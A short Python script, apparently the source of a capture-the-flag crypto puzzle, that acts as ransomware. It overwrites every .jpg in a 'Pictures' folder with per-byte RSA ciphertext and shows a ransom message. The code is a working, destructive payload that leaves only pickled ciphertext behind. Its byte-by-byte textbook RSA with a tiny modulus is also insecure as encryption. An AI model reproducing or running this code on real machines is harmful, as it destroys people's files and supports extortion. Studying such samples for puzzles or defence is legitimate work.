import os
import pickle
import tkinter as tk
from tkinter import messagebox

filepath = os.path.dirname(os.path.realpath(__file__))
directory = filepath + "/Pictures/"

root = tk.Tk()
root.withdraw()

e = 65535
n = 22291846172619859445381409012451
# fuck, how can i get d??

for filename in os.listdir(directory):
    if filename.endswith(".jpg"):
        file = directory + filename
        plain_bytes = b''
        with open(file, 'rb') as f:
            plain_bytes = f.read()
        cipher_int = [pow(i, e, n) for i in plain_bytes]
        with open(file, 'wb') as f:
            pickle.dump(cipher_int, f)
        continue
    else:
        continue

messagebox.showerror('Error', 'Give me ransom haha')